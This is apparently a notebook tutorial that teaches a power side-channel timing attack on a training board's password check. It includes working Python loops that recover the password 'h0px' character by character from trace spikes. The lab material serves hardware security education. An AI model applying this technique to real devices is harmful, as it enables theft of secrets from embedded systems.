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","dtype":"float64","shape":[2000]}},"selected":{"id":"1165","type":"Selection"},"selection_policy":{"id":"1166","type":"UnionRenderers"}},"id":"1140","type":"ColumnDataSource"},{"attributes":{},"id":"1127","type":"ResetTool"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"plot":null,"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1131","type":"BoxAnnotation"},{"attributes":{"dimension":1,"plot":{"id":"1104","subtype":"Figure","type":"Plot"},"ticker":{"id":"1119","type":"BasicTicker"}},"id":"1122","type":"Grid"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1142","type":"Line"},{"attributes":{"data_source":{"id":"1140","type":"ColumnDataSource"},"glyph":{"id":"1141","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1142","type":"Line"},"selection_glyph":null,"view":{"id":"1144","type":"CDSView"}},"id":"1143","type":"GlyphRenderer"}],"root_ids":["1104"]},"title":"Bokeh Application","version":"1.0.1"}};
      var render_items = [{"docid":"937c0b1c-fd5e-495e-8e1e-ef89b77454f3","roots":{"1104":"f365f90e-432d-46da-9d0a-9ca0837e9abc"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We’ll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.32 at 125 in red
and 165 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 125, 165,
-0.32, and 40).

Attacking a Single Letter
-------------------------

Now that we’ve located a distinctive timing difference, we can start
building our attack. We’ll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we’ll create a loop that: \* Figures out our next guess \* Does the
capture and records the trace \* Checks if sample 125 is less than -0.3
(replace with appropriate values)

The below loop finds the first correct character, prints it, then ends.
You should see “Success: h” after a while.


**In [15]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if trace[125] < -0.3:
            print("Success: " + c)
            break


**Out [15]:**



.. parsed-literal::

    Success: h
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] < -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[125 + 40 * i] < -0.2
    
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [16]:**



.. parsed-literal::

    Success, pass now h
    Success, pass now h0
    Success, pass now h0p
    Success, pass now h0px
    


That’s it! You should have successfully cracked a password using the
timing attack. Some notes on this method: \* The target device has a
finite start-up time, which slows down the attack. If you wish, remove
some of the ``printf()``\ ’s from the target code, recompile and
reprogram, and see how quickly you can do this attack. \* The current
script doesn’t look for the “WELCOME” message when the password is OK.
That is an extension that allows it to crack any size password. \* If
there was a lock-out on a wrong password, the system would ignore it, as
it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [17]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [18]:**

.. code:: ipython3

    assert (password == "h0px3" or password == "h0px"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)
